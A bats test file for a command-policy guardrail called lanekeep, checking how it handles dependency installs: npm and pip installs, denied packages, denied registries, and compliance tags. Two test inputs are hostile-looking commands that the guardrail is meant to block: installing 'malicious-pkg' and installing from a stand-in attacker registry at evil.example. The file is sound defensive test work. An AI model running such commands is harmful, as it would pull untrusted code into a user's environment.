#!/usr/bin/env bats
# Tests for dependency install monitoring (rules + policies + compliance tags)

setup() {
  # Test lives at lanekeep/tests/rules/, so ../.. resolves to the lanekeep repo root.
  LANEKEEP_DIR="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
  export LANEKEEP_DIR
  source "$LANEKEEP_DIR/lib/eval-rules.sh"

  TEST_TMP="$(mktemp -d)"
}

teardown() {
  rm -rf "$TEST_TMP" ; return 0
}

# ── 1. npm install triggers ask decision ──

@test "dependency: npm install triggers ask" {
  export LANEKEEP_CONFIG_FILE="$LANEKEEP_DIR/defaults/lanekeep.json"
  rules_eval "Bash" '{"command":"npm install express"}' || true
  [ "$RULES_DECISION" = "ask" ]
  [[ "$RULES_REASON" == *"Dependency install"* ]]
}

# ── 2. pip install triggers ask decision ──

@test "dependency: pip install triggers ask" {
  export LANEKEEP_CONFIG_FILE="$LANEKEEP_DIR/defaults/lanekeep.json"
  rules_eval "Bash" '{"command":"pip install requests"}' || true
  [ "$RULES_DECISION" = "ask" ]
  [[ "$RULES_REASON" == *"Dependency install"* ]]
}

# ── 3. packages policy blocks denied package name ──

@test "dependency: packages policy blocks denied package" {
  cat > "$TEST_TMP/rules.json" <<'EOF'
{
  "rules": [],
  "policies": {
    "packages": {
      "enabled": true,
      "default": "allow",
      "allowed": [],
      "denied": ["malicious-pkg"],
      "type": "free"
    }
  }
}
EOF
  export LANEKEEP_CONFIG_FILE="$TEST_TMP/rules.json"
  rules_eval "Bash" '{"command":"npm install malicious-pkg"}' || true
  [ "$RULES_PASSED" = "false" ]
  [[ "$RULES_REASON" == *"packages"* ]]
}

# ── 4. registries policy blocks denied registry pattern ──

@test "dependency: registries policy blocks denied registry" {
  cat > "$TEST_TMP/rules.json" <<'EOF'
{
  "rules": [],
  "policies": {
    "registries": {
      "enabled": true,
      "default": "allow",
      "allowed": [],
      "denied": ["--registry"],
      "type": "free"
    }
  }
}
EOF
  export LANEKEEP_CONFIG_FILE="$TEST_TMP/rules.json"
  rules_eval "Bash" '{"command":"npm install express --registry http://evil.example"}' || true
  [ "$RULES_PASSED" = "false" ]
  [[ "$RULES_REASON" == *"registries"* ]]
}

# ── 5. npm test does not trigger dependency rule ──

@test "dependency: npm test does not trigger dependency rule" {
  export LANEKEEP_CONFIG_FILE="$LANEKEEP_DIR/defaults/lanekeep.json"
  rules_eval "Bash" '{"command":"npm test"}' || true
  [ "$RULES_PASSED" = "true" ]
}

# ── 6. Compliance tags present in rule result ──

@test "dependency: compliance tags present in rule result" {
  export LANEKEEP_CONFIG_FILE="$LANEKEEP_DIR/defaults/lanekeep.json"
  rules_eval "Bash" '{"command":"npm install express"}' || true
  echo "$RULES_COMPLIANCE" | jq -e 'length > 0'
  echo "$RULES_COMPLIANCE" | jq -e 'any(. == "SOC2 CC6.1")'
  echo "$RULES_COMPLIANCE" | jq -e 'any(. == "NIST SP800-53 SR-3")'
}
